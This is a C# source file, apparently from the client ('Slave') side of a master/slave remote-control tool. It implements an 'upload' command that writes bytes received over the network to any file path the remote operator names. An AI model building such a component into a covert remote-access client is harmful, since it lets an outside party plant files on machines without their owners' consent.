using Shared;
using Slave.Commands.Core;
using System;
using System.Collections.Generic;
using System.IO;

namespace Slave.Commands
{
    internal class Upload : ICommand
    {
        public string name { get; } = "upload";

        public void Process(List<string> args)
        {
            try
            {
                using (var fs = new FileStream(args[1], FileMode.Create))
                {
                    SlaveCommandsManager.networkManager.NetworkStreamToStream(fs);
                }

                SlaveCommandsManager.networkManager.WriteLine("Success");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(args[1]);
                SlaveCommandsManager.networkManager.WriteLine("Error");
            }
        }
    }
}
